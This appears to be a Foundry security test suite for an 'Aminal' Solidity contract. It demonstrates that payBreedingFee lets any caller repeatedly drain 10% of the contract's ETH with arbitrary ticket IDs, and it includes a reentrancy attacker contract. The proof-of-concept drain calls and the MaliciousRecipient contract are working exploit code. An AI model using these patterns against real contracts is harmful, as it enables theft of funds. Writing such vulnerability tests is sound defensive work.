// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {AminalFactory} from "src/AminalFactory.sol";
import {Aminal} from "src/Aminal.sol";
import {IGenes} from "src/interfaces/IGenes.sol";
import {AminalTestBase} from "../base/AminalTestBase.sol";

contract PayBreedingFeeSecurityTest is AminalTestBase {
    address public attacker = makeAddr("attacker");
    address public innocent = makeAddr("innocent");
    
    function setUp() public override {
        super.setUp();
        
        // Give attacker some ETH for gas
        vm.deal(attacker, 10 ether);
        
        // Fund the test Aminal with ETH
        vm.deal(innocent, 100 ether);
        (bool success,) = address(aminal).call{value: 50 ether}("");
        require(success, "Failed to fund aminal");
    }
    
    function test_SecurityVulnerability_AnyoneCanDrainFunds() public {
        // Record initial balances
        uint256 aminalBalanceBefore = address(aminal).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        console2.log("Aminal balance before:", aminalBalanceBefore);
        console2.log("Attacker balance before:", attackerBalanceBefore);
        
        // ATTACK: Attacker calls payBreedingFee directly without any authorization
        vm.startPrank(attacker);
        
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;
        
        // First drain - 10% of balance
        uint256 firstDrain = aminal.payBreedingFee(recipients, 12345); // Random ticket ID
        console2.log("First drain amount:", firstDrain);
        
        // Second drain - 10% of remaining balance
        uint256 secondDrain = aminal.payBreedingFee(recipients, 67890); // Another random ID
        console2.log("Second drain amount:", secondDrain);
        
        // Third drain - 10% of remaining balance
        uint256 thirdDrain = aminal.payBreedingFee(recipients, 99999); // Yet another ID
        console2.log("Third drain amount:", thirdDrain);
        
        vm.stopPrank();
        
        // Calculate total stolen
        uint256 totalStolen = firstDrain + secondDrain + thirdDrain;
        uint256 aminalBalanceAfter = address(aminal).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        
        console2.log("Total stolen:", totalStolen);
        console2.log("Aminal balance after:", aminalBalanceAfter);
        console2.log("Attacker balance after:", attackerBalanceAfter);
        
        // Verify the attack succeeded
        assertEq(aminalBalanceAfter, aminalBalanceBefore - totalStolen);
        assertGt(attackerBalanceAfter, attackerBalanceBefore); // Attacker gained ETH
        assertGt(totalStolen, 0); // Attack actually drained funds
        
        // Show that attacker can continue draining
        assertTrue(aminalBalanceAfter > 0, "Aminal still has funds that can be drained");
    }
    
    function test_SecurityVulnerability_MultipleRecipientsDrain() public {
        uint256 aminalBalanceBefore = address(aminal).balance;
        
        // Attacker uses multiple addresses to make it look legitimate
        address attacker2 = makeAddr("attacker2");
        address attacker3 = makeAddr("attacker3");
        
        address[] memory recipients = new address[](3);
        recipients[0] = attacker;
        recipients[1] = attacker2;
        recipients[2] = attacker3;
        
        vm.prank(attacker);
        uint256 drained = aminal.payBreedingFee(recipients, 1);
        
        // Each recipient gets equal share
        uint256 expectedPerRecipient = drained / 3;
        assertEq(attacker.balance, expectedPerRecipient);
        assertEq(attacker2.balance, expectedPerRecipient);
        // attacker3 gets remainder due to rounding
        assertEq(attacker3.balance, drained - (expectedPerRecipient * 2));
        
        // Total drained is 10% of original balance
        assertEq(drained, aminalBalanceBefore / 10);
    }
    
    function test_SecurityVulnerability_NoTicketValidation() public {
        // Attacker can use ANY ticket ID - even non-existent ones
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;
        
        vm.startPrank(attacker);
        
        // Use completely random ticket IDs
        uint256 drain1 = aminal.payBreedingFee(recipients, 0);
        uint256 drain2 = aminal.payBreedingFee(recipients, type(uint256).max);
        uint256 drain3 = aminal.payBreedingFee(recipients, 424242424242);
        
        vm.stopPrank();
        
        // All calls succeed regardless of ticket ID validity
        assertGt(drain1, 0);
        assertGt(drain2, 0);
        assertGt(drain3, 0);
    }
    
    function test_SecurityVulnerability_ReentrancyAttack() public {
        // Deploy malicious recipient contract
        MaliciousRecipient malicious = new MaliciousRecipient(address(aminal));
        
        // Fund the Aminal
        vm.deal(address(this), 100 ether);
        (bool success,) = address(aminal).call{value: 100 ether}("");
        require(success);
        
        uint256 balanceBefore = address(aminal).balance;
        console2.log("Aminal balance before:", balanceBefore);
        
        // Attempt reentrancy attack
        address[] memory recipients = new address[](1);
        recipients[0] = address(malicious);
        
        vm.prank(attacker);
        aminal.payBreedingFee(recipients, 1);
        
        uint256 balanceAfter = address(aminal).balance;
        uint256 maliciousBalance = address(malicious).balance;
        
        console2.log("Aminal balance after:", balanceAfter);
        console2.log("Malicious contract balance:", maliciousBalance);
        console2.log("Reentrancy attempts:", malicious.reentrancyAttempts());
        
        // The attack can attempt multiple reentries
        assertGt(malicious.reentrancyAttempts(), 0);
    }
    
    function testFuzz_DrainAmountCalculation(uint256 balance) public {
        balance = bound(balance, 1 ether, 1000 ether);
        
        // Fund an Aminal
        vm.deal(address(this), balance);
        (bool success,) = address(aminal).call{value: balance}("");
        require(success);
        
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;
        
        // Calculate expected drain (10%)
        uint256 expectedDrain = balance / 10;
        
        vm.prank(attacker);
        uint256 actualDrain = aminal.payBreedingFee(recipients, 1);
        
        assertEq(actualDrain, expectedDrain);
        assertEq(address(aminal).balance, balance - expectedDrain);
    }
}

// Malicious contract for reentrancy testing
contract MaliciousRecipient {
    address public target;
    uint256 public reentrancyAttempts;
    
    constructor(address _target) {
        target = _target;
    }
    
    receive() external payable {
        reentrancyAttempts++;
        
        // Try to reenter if we haven't tried too many times
        if (reentrancyAttempts < 3) {
            address[] memory recipients = new address[](1);
            recipients[0] = address(this);
            
            try Aminal(payable(target)).payBreedingFee(recipients, reentrancyAttempts) {
                // Reentrancy succeeded
            } catch {
                // Reentrancy failed (expected if protected)
            }
        }
    }
}